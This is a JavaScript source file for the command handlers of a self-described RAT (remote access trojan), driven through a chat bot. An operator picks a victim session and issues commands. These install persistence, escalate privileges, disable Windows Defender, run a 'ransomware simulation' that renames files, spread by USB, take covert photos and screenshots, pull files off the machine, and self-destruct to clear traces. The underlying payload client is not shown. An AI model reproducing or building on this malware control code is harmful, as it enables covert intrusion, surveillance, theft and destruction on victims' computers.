import { ResponseFormatter } from '../utils/formatter.js';

/**
 * Fun Commands Module - Entertainment, pranks, and advanced features
 */

export class FunCommands {
  constructor(ratClient, sock) {
    this.ratClient = ratClient;
    this.sock = sock;
  }

  /**
   * Message box command
   */
  async msgbox(chatId, sessionId, args) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    if (args.length < 1) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error('Usage: /msgbox <message>') 
      });
      return;
    }

    const msg = args.join(' ');
    const result = await this.ratClient.showMessageBox(sessionId, msg);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success(`✅ Message box displayed\n\n"${msg}"`) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Beep command - play system sound
   */
  async beep(chatId, sessionId, args) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const freq = args[0] ? parseInt(args[0]) : 1000;
    const duration = args[1] ? parseInt(args[1]) : 500;

    const result = await this.ratClient.beep(sessionId, freq, duration);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success(`🔊 Beep sent: ${freq}Hz for ${duration}ms`) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Lock workstation
   */
  async lock(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.executing('Locking workstation...') 
    });

    const result = await this.ratClient.lock(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success('🔒 Workstation locked') 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Shutdown command
   */
  async shutdown(chatId, sessionId, args) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const delay = args[0] ? parseInt(args[0]) : 60;

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.warning(`⚠️ Scheduling shutdown in ${delay} seconds...`) 
    });

    const result = await this.ratClient.shutdown(sessionId, false);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.info(`System will shut down in ${delay} seconds`) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // PERSISTENCE & PRIVILEGE ESCALATION
  // ═══════════════════════════════════════════════════════════════

  /**
   * Establish persistence
   */
  async persist(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.executing('Installing persistence mechanism...') 
    });

    const result = await this.ratClient.persist(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success('✅ Persistence installed\n\nTarget will reconnect even after restart') 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Privilege escalation
   */
  async elevate(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.executing('Attempting privilege escalation...') 
    });

    const result = await this.ratClient.elevate(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success('✅ Privilege escalation successful\n\nNow running with ADMIN privileges') 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('⚠️ Privilege escalation failed:\n\n' + result.error) 
      });
    }
  }

  /**
   * Disable Windows Defender
   */
  async defenderOff(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.executing('Disabling Windows Defender...') 
    });

    const result = await this.ratClient.disableDefender(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success('✅ Windows Defender disabled\n\nAntivirus protection is now off') 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('⚠️ Defender disable failed:\n\n' + result.error) 
      });
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // ADVANCED DESTRUCTIVE COMMANDS
  // ═══════════════════════════════════════════════════════════════

  /**
   * Ransomware demonstration
   */
  async ransom(chatId, sessionId, args) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    if (args.length < 1) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error('Usage: /ransom <target_path>\n\nExample: /ransom C:\\\\Users\\\\Documents') 
      });
      return;
    }

    const targetPath = args.join(' ');
    
    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.warning(`⚠️ WARNING: Simulating ransomware on ${targetPath}...\n\n_This WILL rename files with .encrypted extension_`) 
    });

    const result = await this.ratClient.simulateRansomware(sessionId, targetPath);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.info(`✅ Ransomware simulation complete\n\n${result.data}`) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * USB spreading
   */
  async spread(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.executing('Initiating USB spreading mechanism...\n\n_Please wait..._') 
    });

    const result = await this.ratClient.spreadUSB(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success(`✅ USB spreading active\n\n${result.data}`) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('⚠️ USB spreading failed:\n\n' + result.error) 
      });
    }
  }

  /**
   * Self-destruct
   */
  async selfDestruct(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.warning(`⚠️ SELF-DESTRUCT INITIATED\n\nThe RAT will:\n1. Clean all traces\n2. Remove persistence\n3. Exit gracefully`) 
    });

    const result = await this.ratClient.selfDestruct(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success('✅ Self-destruct sequence complete\n\nSession has been terminated') 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // FILE OPERATIONS (Advanced)
  // ═══════════════════════════════════════════════════════════════

  /**
   * Download file from target
   */
  async downloadFile(chatId, sessionId, args) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    if (args.length < 1) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error('Usage: /download <file_path>') 
      });
      return;
    }

    const filePath = args.join(' ');

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info(`📥 Downloading: ${filePath}\n\n_Please wait..._`) 
    });

    const result = await this.ratClient.downloadFile(sessionId, filePath);
    
    if (result.success) {
      try {
        const buffer = Buffer.from(result.data, 'base64');
        await this.sock.sendMessage(chatId, { 
          document: buffer,
          mimetype: 'application/octet-stream',
          fileName: result.filename,
          caption: `📥 Downloaded: ${result.filename}`
        });
      } catch (err) {
        await this.sock.sendMessage(chatId, { 
          text: ResponseFormatter.info(`File size: ${result.data.length} bytes\n\n_File data received (too large to display)_`) 
        });
      }
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Restart system
   */
  async restart(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.warning('🔄 *Restarting system in 30 seconds...*\n\nTarget system will restart') 
    });

    const result = await this.ratClient.restart(sessionId);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.info(result.data) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Screenshot timelapse
   */
  async timelapse(chatId, sessionId, count, interval) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const photoCount = count || 5;
    const photoInterval = interval || 5;
    const totalTime = photoCount * photoInterval;

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info(`📸 Starting timelapse...\n\n${photoCount} photos every ${photoInterval}s\nTotal time: ~${totalTime}s\n\n_Please wait..._`) 
    });

    const result = await this.ratClient.screenshotTimelapse(sessionId, photoCount, photoInterval);
    
    if (result.success) {
      let response = ResponseFormatter.header('📸', 'TIMELAPSE CAPTURE') + '\n\n';
      
      try {
        const timelapse = typeof result.data === 'string' ? JSON.parse(result.data) : result.data;
        response += `✅ Captured ${timelapse.total || photoCount} photos\n`;
        response += `⏱️ Interval: ${timelapse.interval || photoInterval}s\n`;
        response += `📦 Total size: ${timelapse.total_size || 'Unknown'}\n`;
        response += `\n_Photos can be processed server-side_`;
      } catch {
        response += result.data;
      }
      
      await this.sock.sendMessage(chatId, { text: response });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Photo burst
   */
  async photoBurst(chatId, sessionId, count) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const photoCount = count || 3;

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info(`📷 Taking ${photoCount} photos in burst mode...\n\n_Please wait..._`) 
    });

    const result = await this.ratClient.photoBurst(sessionId, photoCount);
    
    if (result.success) {
      let response = ResponseFormatter.header('📷', 'PHOTO BURST') + '\n\n';
      
      try {
        const burst = typeof result.data === 'string' ? JSON.parse(result.data) : result.data;
        response += `✅ Captured ${burst.count || photoCount} photos\n`;
        response += `🎯 Each ~${burst.size_per_photo || 'Unknown'}KB\n`;
        response += `📦 Total: ${burst.total_size || 'Unknown'}\n`;
        response += `\n_Photos are base64 encoded and ready for delivery_`;
      } catch {
        response += result.data;
      }
      
      await this.sock.sendMessage(chatId, { text: response });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * List USB devices
   */
  async usbList(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('💾 Enumerating USB devices...\n\n_Please wait..._') 
    });

    const result = await this.ratClient.enumerateUSB(sessionId);
    
    if (result.success) {
      let response = ResponseFormatter.header('💾', 'USB DEVICES') + '\n\n';
      
      try {
        const devices = typeof result.data === 'string' ? result.data.split('\n') : result.data;
        const filtered = (Array.isArray(devices) ? devices : [devices]).filter(d => d && d.trim());
        
        if (filtered.length === 0) {
          response += 'No USB devices connected';
        } else {
          filtered.slice(0, 10).forEach((dev, idx) => {
            response += `${idx + 1}. ${dev.trim()}\n`;
          });
        }
      } catch {
        response += result.data;
      }
      
      await this.sock.sendMessage(chatId, { text: response });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }
}
